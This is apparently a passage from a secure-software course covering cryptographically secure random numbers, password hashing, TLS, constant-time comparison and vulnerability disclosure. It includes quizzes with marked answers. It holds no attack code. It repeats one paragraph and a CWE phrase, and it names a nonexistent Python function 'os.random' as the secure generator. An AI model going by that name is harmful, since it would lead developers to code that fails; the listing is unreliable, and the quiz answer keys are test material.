Many algorithms depend on secret values that cannot be practically guessed by an attacker, aka "cryptographically secure". This includes values used by cryptography algorithms (such as private keys and nonces), session ids, and many other values. If an attacker can guess a value, including past or future values, many systems become insecure.

One challenge is historical: today, the name *random* in programming language libraries usually implies that the function is *not* cryptographically secure. One of the first uses for digital computers was to implement simulations (especially *Monte Carlo simulations*) where random numbers were repeatedly acquired for a simulation. It was often important to be able to *reconstruct* these random numbers so experiments could be repeated. Internally, such random functions would be implemented using algorithms such as a linear congruential generator (LCG), and would often be “seeded” (initialized) by values such as a date/time that can be trivially guessed by an attacker. Because this was one of the first uses of computers, there is a convention across almost all programming languages that the word “random” refers to a way to create a sequence of numbers that could be easily reconstructed later if needed. In other words, the word “random” in programming languages typically implies “*predictably random*”, and that is not what you want in cryptography or security. Such random numbers *must not* be used for security mechanisms where it is important that an attacker *not* be able to determine the number.

![In this figure getRandomNumber is implemented by returning the constant 4, a number chosen by fair dice roll and claimed to be guaranteed to be random.](random_number.png)

**Random Number**, retrieved from [xkcd.com](https://xkcd.com/221), licensed under [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

Instead, for cryptography and security-related tasks you need to use a [cryptographically secure pseudo-random number generator (CSPRNG)](https://en.wikipedia.org/wiki/Cryptographically-secure_pseudorandom_number_generator) for crypto and security-related tasks. Put another way, there are many pseudo-random number generator (PRNG) algorithms and implementations, but for security, you should *only* use PRNGs that are cryptographically secure PRNGs (CSPRNGs). A good CSPRNG prevents practically predicting the next output given past outputs (at greater than random chance) and it also prevents revealing past outputs if its internal state is compromised. CSPRNGs are also called cryptographic PRNGs (CPRNGs). Typically a CSPRNG implementation's name will have “secure” and/or “crypto” in it. In their documentation, you may see references to well-accepted CSPRNG algorithms such as Yarrow, Fortuna, ANSI X9.17 (which can use any block cipher), NIST SP 800-90A’s Hash_DRBG, HMAC_DRBG, and CTR_DRBG.

**🚩 Never use the algorithm Dual_EC_DRBG, as it is widely accepted that this is a subverted and insecure algorithm.**

Here are some examples of how to call the predictable PRNG versus a cryptographically secure PRNG in different programming languages (in practice there are often multiple ways; the point is to show that they are different):

<table>
  <tr>
    <td>Language</td>
    <td>Predictable random value<br>(do not use for security)</td>
    <td>Cryptographically secure random value</td>
  </tr>
  <tr>
    <td>Java</td>
    <td>Random()</td>
    <td>SecureRandom()</td>
  </tr>
  <tr>
    <td>C#</td>
    <td>System.Random</td>
    <td>System.Security.Cryptography. RandomNumberGenerator</td>
  </tr>
  <tr>
    <td>JavaScript</td>
    <td>Math.random</td>
    <td>window.crypto.getRandomValues<br>or crypto.randomBytes</td>
  </tr>
  <tr>
    <td>Python</td>
    <td>random</td>
    <td>os.random</td>
  </tr>
</table>

Another challenge is that software is fundamentally deterministic; given exactly the same inputs, a sequential algorithm should produce exactly the same output. You should not normally be directly seeding (initializing) any cryptographically secure algorithms, as many of these libraries implement secure seeding themselves. If you must seed it (and that is a bad sign), ensure that attackers cannot guess the seed value. Some people seed cryptographically secure PRNGs algorithms with date/time data, which is a vulnerability; in many cases, attackers can easily guess the likely date/times.

There is a simple solution: use a CSPRNG and use hardware to correctly provide data to it. Most operating system kernels today provide cryptographically secure random numbers by gathering environmental noise from multiple hardware devices and implementing a CSPRNG. If you’re running on bare metal (instead of an operating system kernel) there are usually reusable libraries you can use for this purpose. These cryptographically secure random numbers can be used directly, or can be used as a secure seed for a cryptographically secure PRNG.

For example, the Linux kernel provides cryptographically secure random number values via its `getrandom` system call, as well as the special files `/dev/urandom` and `/dev/random`. In most cases you would want to use the `getrandom` system call where practical, or the `/dev/urandom` special file if `getrandom` is hard to access (e.g., from a shell script). These generate cryptographically secure random values using a CSPRNG and entropy gathered by the kernel. In special circumstances, such as creating a long-lived cryptographic key, you might instead want to use `/dev/random` or the equivalent option in `getrandom`; this forces the kernel to wait (block) until it has a high estimated amount of internal entropy. The purpose of `/dev/random` is to ensure there is a large amount of internal entropy, but the blocking may be indefinite in some circumstances and it’s usually not necessary. What's important is that an attacker can't practically guess the random value, not the value of this internal entropy estimate. (see [“Myths about /dev/urandom”](https://www.2uo.de/myths-about-urandom/) by Thomas). In the future there may be no difference between `/dev/random` and `/dev/urandom`.

For example, the Linux kernel provides cryptographically secure random number values via its **/dev/urandom** special file, its **/dev/random** special file, and its **getrandom** system call. In most cases you would want to use the **/dev/urandom** special file or the **getrandom** system call. These generate cryptographically secure random values using a CSPRNG and entropy gathered by the kernel. In special circumstances, such as creating a long-lived cryptographic key, you might instead want to use **/dev/random** or the equivalent option in **getrandom**; this forces the kernel to wait (block) until it has a high estimated amount of internal entropy. The purpose of **/dev/random** is to ensure there is internal entropy, but the blocking may be indefinite in some circumstances and it’s usually not necessary

A particularly nasty security problem in computer systems is *insecure random number generators*. An insecure random number generator produces values that look fine, but destroys the security of the entire system. Many failures of cryptographic systems have been traced back to bad random number generation, in part because it can be hard to detect the problem.

In many cases using insecure random number generators is an unintentional mistake, but in some cases organizations *intentionally* subvert random number generators. For example, in 2020 it was revealed that the US CIA, in cooperation with West Germany intelligence, owned the company Crypto AG and had widely sold cryptographic products that had been intentionally subverted, in at least some cases by tampering with how it generated “random” values. See [The intelligence coup of the century](https://www.washingtonpost.com/graphics/2020/world/national-security/cia-crypto-encryption-machines-espionage/) by Greg Miller for more information.

Insecure random number generation is an especially serious problem in Internet of Things (IoT) device software. One 2021 report found that about 35 billion IoT devices had disastrous security vulnerabilities due to insecure cryptographic random number generation. This is in part because many IoT software developers directly call hardware random number generators (they shouldn’t do that), but even worse, they ignored error return codes from those generators (and they definitely shouldn’t do that). Hardware random number generators typically have easily-exceeded generation rates, so they can generate random numbers at limited speeds only. If users read too fast, the generator will likely report errors. Just paying attention to the error code from the hardware isn’t really enough, though.  Hardware sometimes fails, and if the software just hangs in that case, the IoT device may be too unreliable to compete. Sample code for accessing the random number generator hardware is often insecure (it shows how to get data, but not how to use it correctly). Correctly using the hardware directly can be quite difficult, for example, the LPC 54628’s user manual page number 1,106 (of 1,152) notes, in a convoluted way, that after reading a random number from its hardware you must read and throw away the next 32 values. The same research also shows that hardware random number generators from popular processors used in IoT products do not generate fully random data. One can use a randomness test to verify if the generated numbers are actually random.

Software developers for IoT devices should not access the hardware registers directly, but should instead call well-crafted CSPRNG generators that correctly use hardware sources (preferably multiple sources) as inputs into their internal entropy pool. In most cases IoT developers should use an IoT operating system that includes a CSPRG implementation that is correctly seeded from multiple hardware sources, and simply check to see if it appears to be carefully written for security. Where that’s not practical, use a well-crafted and analyzed CSPRNG library that includes correct software to extract random values from your hardware; do not implement your own crypto unless you’re an expert in cryptography. IoT software developers should also run statistical tests on their random number generation mechanism to ensure that they’re random, because this is an especially common problem in IoT devices. For more details, see [You're Doing IoT RNG](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng) ([presentation](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)) by Dan Petro and Allan Cecil, a 2021 DEF CON presentation.

In summary: Make sure you use a strong, properly-implemented cryptographically secure pseudo-random random number (CSPRNG) generator, seeded with multiple hardware values, every time you need a value that an adversary cannot predict. You should look for a function that says it’s a “secure” or “cryptographic” random number generator. Don’t use an ordinary “random” number generator, such as anything documented as using a linear congruential generator (LCG), for those purposes.

> 😱 STORY TIME: Vulnerable Keys Generated by Debian/Ubuntu’s OpenSSL

> In 2006 Debian Linux made a change to its version of the widely-used OpenSSL cryptographic library to attempt to remove a warning. However, the change was made by someone not well-versed in cryptography and unintentionally subverted OpenSSL's random number generator for keys on Debian. There was a brief attempt to communicate with the upstream OpenSSL library developers, but there was no attempt to propose the change back to the OpenSSL project so that the OpenSSL project could verify that the change was harmless. This meant that all keys generated via OpenSSL by Debian, as well as Ubuntu (which is based on Debian), were insecure until the vulnerability was found in 2008. This included OpenSSH keys generated by calling OpenSSL. This vulnerability was given the identifier [CVE-2008-0166](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166). Seven years later, Ben Cox reported that a large number of vulnerable keys created from this mistake were still in use and some had control over important GitHub repositories. These included repositories of Spotify, Yandex, the cryptographic libraries for Python, and Python’s core. (Ben Cox, “[Auditing GitHub users’ SSH key quality](https://blog.benjojo.co.uk/post/auditing-github-users-keys)”, 2015). This example shows how important cryptographically secure random values can be.

If you need a cryptographically random number in a range
(e.g., an integer from 0 to a number N),
do **not** simply use the modulus or remainder operators.
Many programmers incorrectly *think* it's fine to directly use the
modulus or remainder operators (e.g., `%` or `mod` in many languages)
for this purpose.
However, this often causes some numbers to be more likely than others,
a problem called *modulo bias*.
Modulo bias can sometimes lead to system exploitation.
(Yolan Romailler,
[*The definitive guide to “Modulo Bias and how to avoid it”!*](https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/))

If you need a cryptographically random number in a range, don't use modulus
or remainder operators directly - instead, use an existing
function that provides *unbiased* cryptographically random numbers in a range.
Most CSPRNG libraries provide this function - just check that it's unbiased.
If you must implement this yourself, there are various methods such
as rejection sampling,
[nearly-divisionless random numbers per Daniel Lemire's algorithm](https://dotat.at/@/2020-10-29-nearly-divisionless-random-numbers.html), or
[divisionless random numbers per Steve Cannon and Kendall Willets](https://dotat.at/@/2022-04-20-really-divisionless.html).
However, you should normally just use the CSPRNG library function
that provides this function.

#### Quiz 3.4: Cryptographically Secure Pseudo-Random Number Generator (CSPRNG)

\>>Select the true statement(s):<<

\[!x] In many programming languages, a cryptographically secure pseudo-random number generator will have “secure” or “crypto” in its name.

\[x] In many programming languages, a function/method with the name “random” but no other indicator is typically a predictable random number and should not be used for security.

\[ ] It is easy to tell if a cryptographic PRNG is subverted.

### Storing Passwords

A common need is that you are implementing a service and/or server application, and you need the user to authenticate and/or prove that they are authorized to make a request. This is called *inbound authentication*. Here are three common approaches for doing this:

1.  Delegate this determination to some other service. You need to trust that other service, and you need a specification for communicating this. OAUTH and OpenID are two common specifications for making the request to the other service. Generally, you would call on a routine to implement this; make sure you apply its security guidance. This can be convenient to users, but remember that this reveals every login to that external service (a privacy concern), and make sure you can trust that service.

2.  Require the requestor to have a private key that proves their identity. SSH and HTTPS both support this. A great advantage of this approach is that at the server end only a public key needs to be recorded, so while integrity is important, the confidentiality of the keys is not as critical. However, this requires that the user set up this private key.

3.  Support a password-based login (at least in part).

If you implement option 3, supporting a password-based login (at least in part), you have a lot of company. Passwords have many known problems, but they are known problems. If you are going to use passwords, at least in part, you need to do it correctly.

**Beware** of storing passwords in an insecure way. A database full of password information is a tempting target for attackers. In practice, many attackers have managed to gain databases of password-related information (e.g., by breaking into the service or acquiring a backup). A secure system *must* be designed so that attackers cannot easily exploit server-side password databases, even when attackers manage to retrieve a copy. Here are some approaches that do **NOT** work:

*   Storing passwords “in the clear” (unencrypted). Obviously, if an attacker gets this data, the attacker can use all the passwords. ***Don’t do this!***

*   Hashing the passwords (e.g., with MD5, SHA-1, or SHA-256). Attackers have tools that can brute-force guess billions of passwords, hash them all, and compare them with the hashed values, so this does not protect the passwords. ***Don’t do this!***

*   Per-user salted hashes. This combines the password with a random per-user value called a “salt”, then hashes the combination. The problem is that modern hash algorithms are so fast that attackers can still guess billions of passwords and often find a user’s password. Again, ***don’t do this!***

If you are using passwords for inbound authentication, for security you ***must*** use a special kind of algorithm for this purpose called an *iterated per-user salted cryptographic hash* algorithm. The term “iterated” is also called key derivation. Three algorithms are commonly used as an iterated per-user salted cryptographic hash algorithm:

*   **Argon2id**<br>Unless you have a strong reason to use something else, this is the algorithm to use today. It is relatively strong against both software and hardware-based attacks.

*   **Bcrypt**<br>This is a decent algorithm against software-based attacks. It is not as easy to attack with hardware compared to PBKDF2 (because bcrypt requires more RAM), but it is weaker against hardware-based attacks compared to Argon2id.

*   **PBKDF2**<br>This is a decent algorithm against software-based attacks, but it is the most vulnerable of these widely-used algorithms to hardware-based attacks from specialized circuits or GPUs. That is because it can be implemented with a small circuit and little RAM. You may not need to replace it (depending on the kinds of attackers that concern you), but it is probably best to avoid this for new systems today.

Another algorithm that is in use is scrypt. This should also be strong against hardware attacks, but it has not gotten as much review compared to Argon2id, so Argon2id is more commonly recommended. That said, at the time of this writing, it has no known serious problems.

You should allow users to require the use of two-factor authentication (2FA), either directly or by delegating to a service that does.

Also, beware of implementing these algorithms only on the client side. It is fine to implement them on the client side (because that prevents the server from ever discovering the password the user enters), as long as they are *also* implemented on the server. The danger is doing them *only* on the client; if that happens, then what is stored in the server is no different from storing passwords in the clear. Once attackers get the password database, they can simply create or modify their own client to log into anyone’s account.

> 😱 STORY TIME: Ashley Madison data breach
> Ashley Madison is a Canadian commercial online dating service founded in 2002 and marketed as enabling cheating on romantic partners. In 2015 attackers stole its customer data. Many issues were revealed at that point; we will focus on one here. Ashley Madison had correctly used the **bcrypt** routine to store user passwords. Unfortunately, in many cases they had *also* stored passwords encoded using the **MD5** hashing algorithm, which is not an appropriate algorithm for storing passwords (as noted above). Attackers used these unprotected MD5 password hashes to decipher more than 11 million of these accounts' passwords in just 10 days, enabling them to log into those accounts (["Once seen as bulletproof, 11 million+ Ashley Madison passwords already cracked" by Dan Goodin, 2015](https://arstechnica.com/information-technology/2015/09/once-seen-as-bulletproof-11-million-ashley-madison-passwords-already-cracked/)).

#### Quiz 3.5: Storing Passwords

\>>Select the true statement(s):<<

\[!] You can eliminate all authentication security and privacy concerns by delegating authentication to another service. {{ selected: Not so. For one thing, can you trust that other service? That other service will know who authenticated when; is that acceptable? In many cases it is a good decision to delegate, but you need to consider the ramifications. }}

\[ ] A secure way for a server to store passwords for inbound authentication is to hash the password using SHA-1. {{ selected: Absolutely not, that is an *insecure* approach. You should use an algorithm specifically designed for this purpose, such as Argon2id. }}

\[ ] PBKDF2 is more secure than Argon2id. {{ selected: No, that is the wrong way around. Argon2id has a much stronger resistance to hardware-based attacks than PBKDF2. }}

\[x] Argon2id, bcrypt, and PBKDF2 are all common iterated per-user salted cryptographic hash algorithms; among those three, prefer Argon2id unless you have a reason to do otherwise.

### Transport Layer Security (TLS)

Transport Layer Security (TLS) is a widely-used cryptographic protocol to provide security over a network between two parties. It provides privacy and integrity between those parties. TLS version 1.3 was released in 2018. An older and insecure version of this protocol was named Secure Sockets Layer (SSL), and sometimes the terms are used interchangeably. When you use **https://** in a web browser or server today, you are normally using TLS (in rare cases, you might be using its insecure predecessor, SSL). TLS is also used in other applications, for example, to protect exchanges of email between different Mail Transport Agents (MTAs).

#### Certificate Validation

To use TLS properly, the server side at least needs a certificate (so it can prove to potential clients that it is the system it claims to be). You can create a certificate yourself and install its public key on each client (e.g., web browser) who will connect to that server. That is fine for testing, but in most other situations, that is too complicated. In most cases (other than testing) you should get a certificate assigned by a certificate authority. You can get free certificates from [Let’s Encrypt](https://letsencrypt.org/). If the requirements of Let’s Encrypt don’t suit your needs, other certificate authorities may be useful to you.

When clients connect to a server using TLS, the client normally needs to check that the certificate is valid. Web browsers have long worked this out; web browsers come with a configurable set of certificate authority public keys (directly or via the operating system) and automatically verify each new TLS connection.

*Beware*: If you are using your own client, instead of using a web browser, double-check that you are using the TLS library API *correctly*. Many TLS library APIs do *not* fully verify the server’s TLS certificate automatically. For example, they may allow connections to a server when there is no server certificate, they may allow any certificate (instead of a certificate for the site you are trying to connect to), or allow expired certificates. This is an extremely common mistake ([*The Most Dangerous Code in the World: Validating SSL Certificates in Non-Browser Software*](https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf), by Martin Georgiev, Subodh Iyengar, Suman Jana, Rishita Anubhai, Dan Boneh, and Vitaly Shmatikov, 2012). If this is the case, you may be using a low-level TLS API instead of the API you should be using.

🔔 Improper certificate validation is such a common cause of security vulnerabilities that it is 2021 CWE Top 25 #26 and2021 CWE Top 25 #26 and  2019 CWE Top 25 #25. It is identified as [CWE-295](https://cwe.mitre.org/data/definitions/295.html), *Improper Certificate Validation*.

#### Ciphersuites

TLS, as a protocol, combines many of the pieces we have discussed. At the beginning of communication, the two sides must negotiate to determine the set of algorithms (including key lengths) that will be used for its connection. This set of algorithms is called the *ciphersuite*. That means that, for security, it is important to have good default configurations and to have the software configured correctly when deploying it.

If you are configuring an HTTPS site, a great place to get currently-recommended settings is [Mozilla’s](https://wiki.mozilla.org/Security/Server_Side_TLS) [*Security/Server Side TLS*](https://wiki.mozilla.org/Security/Server_Side_TLS)[site](https://wiki.mozilla.org/Security/Server_Side_TLS). A key decision for you to make is if you want the modern, intermediate, or old configuration:

*   Modern: Most secure, but a non-trivial number of clients might not be able to connect to it.

*   Intermediate: A compromise setting that allows slightly older clients to connect while providing reasonably good security.

*   Old: A setting that provides the best possible security that supports much older clients and libraries. Its security is much weaker than intermediate.

At the time of this writing, the *intermediate setting* is recommended in most cases, but check that website for updates.

You will notice that any configuration has a list of TLS ciphersuites in order of preference. For example, the `TLS_AES_128_GCM_SHA256` means that TLS is to use the Advanced Encryption Standard (AES) with 128-bit key in Galois/Counter mode (GCM) combined with the secure hash algorithm with 256 bits (SHA-256).

Once you have deployed your system, you should test it. If the site is publicly visible, it is a great idea to use the free Qualys test called the [SSL Server Test](https://www.ssllabs.com/ssltest/). It is called the SSL Server Test because that is the old name for TLS, but don’t be fooled, it works well with TLS (and will complain if you allow the vulnerable SSL protocols).

#### Quiz 3.6: Transport Layer Security (TLS)

\>>Select the true statement(s):<<

\[!] If you are invoking a TLS library, it is reasonable to assume that it fully verifies the server’s TLS certificate automatically. {{ selected: Not so. Many libraries do *not* fully verify it, e.g., they might not verify that the certificate is appropriate for a given system. Some do, but when using a TLS library you have not used before, it is important to check what it verifies. }}

\[x] Web browsers use TLS or SSL when connecting to an external site with an “**https:**” URL.

\[x] When web browsers contact a server with TLS, they use a configurable set of certificate authority public keys (either included with the browser or provided via the operating system).

\[x] Recommended HTTPS server settings can be found at Mozilla’s “Security/Server Side TLS” site.

### Other Topics in Cryptography

#### Getting Cryptographic Advice

In this course, we have tried to give some basics and enough information to apply them in various circumstances. Perhaps most important, however, are the key pieces of advice: do not create your own cryptographic algorithms or protocols, and do not create your own implementations. Instead, reuse well-respected algorithms, protocols, and implementations. When configuring cryptography, look for current well-respected advice. Examples of such sources include Mozilla’s [Security/Server Side TLS site](https://wiki.mozilla.org/Security/Server_Side_TLS), NIST (especially NIST’s [*Recommendation for Key Management: Part 1 - General*](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf)), and CISCO’s [*Next Generation Cryptography*](https://tools.cisco.com/security/center/resources/next_generation_cryptography). Cryptographers won’t always agree on what is “best” (as with any other field), but experts will be able to point out what is clearly broken and what is widely agreed to be much safer.

#### Constant Time Algorithms

There is an important topic that we have not mentioned yet: constant-time algorithms, especially constant-time comparisons. Many algorithms take a variable amount of time depending on their data. For example, if you want to determine if two arrays are equal, usually that comparison would stop on the first unequal value.

Those who develop cryptographic libraries must implement their algorithms so that the time they take does not vary based on their input data (this is non-trivial, though possible, with AES). Most developers are never taught how to do this, so this is one of many reasons you should not write your own cryptographic library. However, there is a variation that can often happen outside of these libraries: sometimes you have to handle array comparisons specially.

The normal comparison operations (such as **is-equal**) try to minimize execution time, and this can sometimes leak timing information about the values to attackers. If an attacker could repeatedly send in data and notice that a comparison of a value beginning with “0” takes longer than one that does not, then the first value it is compared to must be “0”. The attacker can then repeatedly guess the second digit, then the third, and so on. Many developers incorrectly believe that it is not possible for attackers to exploit timing variations over a network; this is a false belief attackers love to exploit. Modern statistics turns out to be remarkably powerful for removing latency variances; attackers really *can* exploit these latencies.

*Constant-time comparisons* are comparisons (usually equality) that take the same time no matter what data is provided to them. These are not the same as O(1) operations in computer science. Examples of these constant-time comparison functions are:

*   Node.js: **crypto.timingSafeEqual**

*   Ruby on Rails: **ActiveSupport::SecurityUtils secure_compare** and **fixed_length_secure_compare**

*   Java: **MessageDigest.equal** (assuming you are not using an ancient version of Java)

Whenever you compare secret values or cryptographic values (such as session keys), use a *constant-time comparison* instead of a normal comparison unless an attacker cannot exploit the normal comparison timing. You don’t need to do this with an iterated salted hash computed in a trusted environment (such as your server), because it will take an attacker too much time to create the matching values. You *do* need to do this if you are directly comparing session keys to a stored value, since attackers *can* sometimes iterate this to figure out each digit in the session key.

#### Minimizing the Time Keys/Decrypted Data Exists

Remember that per least privilege, we want to minimize the time a privilege is active. In cryptography, you often want to minimize the time a private key or password is available, or at least minimize the time that the decrypted data is available. This can be harder that you might think. At the operating system level you can probably lock it into memory with **mlock()** or **VirtualLock()**; this will at least prevent the data from being copied into storage. Ideally, you would erase it from memory after use, though that is often surprisingly difficult. Compilers may turn overwrite code into a no-op, because they detect that nothing reads the overwritten values. Languages with built-in garbage collection often quietly make extra copies and/or do not provide a mechanism for erasure. That said, some languages or infrastructure do make this easy. For example, those using the .NET framework (e.g., C#) can use SecureString.

#### Quantum Computing

One of the large future unknowns in cryptography is the potential impact of general-purpose quantum computers. At the time of this writing, so-called *general-purpose* quantum computers exist, but they are not powerful enough to threaten current cryptographic algorithms. It is not known if such more powerful general-purpose quantum computers can be built, and if so, when that will happen. If strong general-purpose quantum computers are built, they have the potential to break all the public-key algorithms that are popular in 2020 by using an algorithm called *Shor’s algorithm*. As a result, researchers are developing new public-key algorithms that resist attacks from such quantum computers, an area called *post-quantum cryptography*. At the time of this writing, many such algorithms have been developed and are being evaluated.

In contrast, current symmetric cryptographic algorithms and hash functions are less affected by quantum computers. Grover’s algorithm speeds up attacks against symmetric ciphers, halving their effective length. That means that 128-bit AES could be broken by a quantum computer (it would then be equivalent to a 64-bit key today), but 256-bit AES would still be secure (it would be equivalent to a 128-bit key today). So simply using longer keys and hashes is expected to be adequate in a post-quantum world for symmetric cryptographic algorithms and hash functions.

#### Humility Is Important in Cryptography

Perhaps the most important lesson here is to be humble when using cryptography. Many cryptographic algorithms have been developed in the past, only to be broken later. It is hubris to think that our current algorithms and protocols cannot be broken.

You should instead have a plan for handling when (not if) your cryptographic algorithms and protocols are broken. Make sure all your co-developers learn of this plan so that they will not ruin it (e.g., if you run an OSS project, put this in the **CONTRIBUTING.md** or equivalent file). In short, plan for change.

Similarly, seek advice from experts, and weigh that advice carefully. Errors in cryptographic systems can be devastating, and can last for many years because they are not obvious. Getting others’ review and constructive feedback is generally a good idea, but it is especially important when using cryptography.

#### Quiz 3.7: Other Topics in Cryptography

\>>Select the true statement(s):<<

\[!] Attackers cannot detect latency within an equality over a network.

\[x] Where practical, you should minimize the time that normally-encrypted data is decrypted.

\[ ] If powerful “general-purpose” quantum computers are developed, they will render all encryption algorithms useless. {{ selected: No. Such computers will render useless common *public-key* algorithms that are popular in 2020. However, while they will halve the effective bit length of symmetric encryption algorithms, they will not render them useless; a 256-bit key for a symmetric encryption algorithm will effectively become a 128-bit key, which is still adequately secure for most purposes. In addition, new public-key algorithms are being developed that resist attacks from such quantum computers. }}

# Other Topics

This chapter describes topics on the fundamentals of developing secure software that have not been covered elsewhere, including handling vulnerability disclosures, assurance cases, the basics after development, formal methods, and top vulnerability lists.

Learning objectives:

1.  Understand how to properly handle vulnerability disclosures.

2.  Discuss the basics of assurance cases.

3.  Discuss the basics beyond development: distributing, fielding/deploying, operations, and disposal.

4.  Get a brief introduction about formal methods.

5.  Take a look at top vulnerability lists (e.g., OWASP Top 10 and CWE Top 25).

## Vulnerability Disclosures

### Receiving Vulnerability Reports

Unfortunately, even after your best efforts, someone may find a vulnerability in the software you have developed. In this unit, we will discuss receiving vulnerability reports, including how to prepare to receive vulnerability reports *before* vulnerabilities are found.

#### Product Security Incident Response Teams (PSIRTs)

If you are part of a team developing a large software application within a single organization, then you probably have or should consider forming a group to address security incidents related to that software. Such teams are sometimes called a Product Security Incident Response Team (PSIRT). The nonprofit Forum of Incident Response and Security Teams (FIRST) defines a PSIRT as *“an entity within an organization which... focuses on the identification, assessment and disposition of the risks associated with security vulnerabilities within the products, including offerings, solutions, components and/or services which an organization produces and/or sells”* ([FIRST](https://www.first.org/standards/frameworks/): *Product Security Incident Response Team (PSIRT) Services Framework* and *Computer Security Incident Response Team (CSIRT) Services Framework*). FIRST recommends that PSIRTs be formed while requirements are still being developed, but they should at least be formed before the initial release of the software. A properly-running PSIRT can identify and rapidly respond to an extremely serious vulnerability report.

PSIRTs often work with computer incident response teams (CSIRTs); a CSIRT is focused on the security of computer systems and/or networks that make up the infrastructure of an entire organization, while PSIRTs focus on specific products/services. Should you have one (or want to establish one), FIRST provides useful frameworks describing what PSIRTs and CSIRTs should do within an organization ([FIRST Services Framework](https://www.first.org/standards/frameworks/)).

Many governments and large companies also have their own requirements and guidelines for how to handle vulnerability reports. If your project is one of their efforts, you will need to follow those requirements and consider its guidelines.

A simple short guide is the [OWASP Vulnerability Disclosure Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html). This short document provides useful guidance for both security researchers (who find security vulnerabilities) and organizations (who receive vulnerability reports).

There are many other useful documents that discuss vulnerability disclosure. In particular:

*   [*The CERT Guide to Coordinated Vulnerability Disclosure*](https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure), by Allen Householder, 2019. In that document the “vendor” is the organization that releases the software and needs to learn about the security vulnerability.

*   FIRST’s [*Guidelines and Practices for Multi-Party Vulnerability Coordination and Disclosure*](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1) <https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1>

The Open Source Security Foundation (OpenSSF) [Vulnerability Disclosures Working Group](https://github.com/ossf/wg-vulnerability-disclosures)
has developed a [Guide to coordinated vulnerability disclosure for open source software projects](https://github.com/ossf/oss-vulnerability-guide). If you maintain an OSS project, apply that guide so you’ll be prepared for vulnerability reports before they happen.

In the rest of this unit we will discuss some of the key issues for accepting vulnerability reports.

#### Publicly State How to Send Vulnerability Reports

You must tell others, publicly, how to send vulnerability reports… and this information must be extremely easy to find. Otherwise, potential reporters will not report vulnerabilities to you, or there may be a significant delay while the project tries to figure out how to receive a report. This is time wasted where time is often of the essence. In 2019, failure to publicly state how to send vulnerability reports was the #1 most common reason OSS projects did not earn the OpenSSF Best Practices *passing* badge ([*Core Infrastructure Initiative (CII) Best Practices Badge in 2019*](https://events19.linuxfoundation.org/wp-content/uploads/2018/07/cii-bp-badge-2019-03.pdf), by David A. Wheeler).

In one sense this requirement is easy. Decide what your reporting convention is, and make that information easy to find. Here are some common conventions:

1.  Many companies and projects support an email address of the form **security@example.com** or **abuse@example.com**.

2.  A common convention in OSS projects is to provide this information in a file named **SECURITY.md** in the repository’s root or **docs/** directory. Sites such as GitHub will highlight this file if present and encourage their creation. Add a link from your **README.md** file to this **SECURITY.md** file.

3.  If the project has or implements a website, a common recommendation is to add a **security.txt** file on the website at **/security.txt** or **/.well-known/security.txt**. To learn more, visit [securitytxt.org](https://securitytxt.org/).

One challenge is that attackers are also very interested in getting vulnerability reports, because they want to exploit those vulnerabilities until everyone installs its fixes or mitigations. So, it is usually important to have some mechanism for reporting vulnerabilities that prevents attackers from also getting this information before a patch is distributed. This can sometimes be hard to do:

1.  Email systems are generally not end-to-end encrypted. Email systems that support end-to-end encryption (e.g., OpenPGP and S/MIME) are not widely used, may be hard to use, and/or are primarily used only within specific communities.

2.  Many other communication systems for 1-on-1 secure communication expect that the parties already know each other, which is often not the case in vulnerability reporting.

3.  OSS projects generally work in the open, so normal reporting and discussion forums (such as issue trackers, chat systems, etc.) may allow many people (or everyone) to see the discussion about a vulnerability, even if it is not supposed to be publicly known.

If you don’t want attackers to immediately exploit vulnerabilities reported to you, you should use some sort of encryption for the initial report. One imperfect but useful solution is to use email systems that support STARTTLS. Most large email providers (like GMail) and many companies support STARTTLS. STARTTLS provides *transport layer encryption*, that is, the emails are encrypted *between* email relays. Transport layer encryption is not as secure as end-to-end encryption, because the emails are decrypted at various points. In addition, STARTTLS is often deployed as *opportunistic TLS* - meaning an active attacker who controls certain network routers or email relays may be able to disable this encryption for a period of time. That said, using email providers who support STARTTLS transparently provides protection from many of the most common kinds of attacks on communication, while being very easy to use.

You should also use encryption to communicate among the key developers if you don’t want attackers to know about what is going on. However, the developers often know each other, so this is usually much easier to accomplish.

#### Monitor for Vulnerabilities, Including Vulnerable Dependencies

As we have already mentioned, monitor for vulnerabilities about your software and all libraries embedded in it. You can use Google alerts to alert you about your software from various news sources. Use a software composition analysis (SCA) / origin analysis tool to alert you about newly-found publicly-known vulnerabilities in your dependencies.

As noted earlier, a software bill of materials (SBOM) is a nested inventory that identifies the software components that make up a larger piece of software. When an SBOM is available for a component you are using, it’s often easier to use that data to help detect known vulnerabilities. Many ecosystems have ecosystem-specific SBOM formats. There are also some SBOM formats that support arbitrary ecosystems: [Software Package Data Exchange (SPDX)](https://spdx.dev/), [Software ID (SWID)](https://csrc.nist.gov/Projects/Software-Identification-SWID/), and [CycloneDX](https://github.com/CycloneDX/specification).

#### Consider Creating a Bug Bounty Program

A widely-used technique to encourage vulnerability reporting is a *bug bounty program*, where you pay reporters to report about especially important defects. This can be a cost-effective way to encourage people to report vulnerabilities to you once all relatively “easy-to-find” vulnerabilities have been found and fixed. If you don’t want to manage such a program yourself, there are various companies that can do that for you for a fee.

Be sure to clearly establish the scope and terms of any bug bounty programs ([OWASP Vulnerability Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). Specify what you will pay for, including a minimum and maximum range. For example, *“$X-$Y for a vulnerability that directly leads to a remote code execution without requiring login credentials.”* If there is a maximum that you can spend in a year, say so, and indicate the total amount, the calendar used, and what will happen to reports after the annual funding is used up. Also make it clear who is ineligible, e.g., developers of the software and/or employees of companies that develop the software.

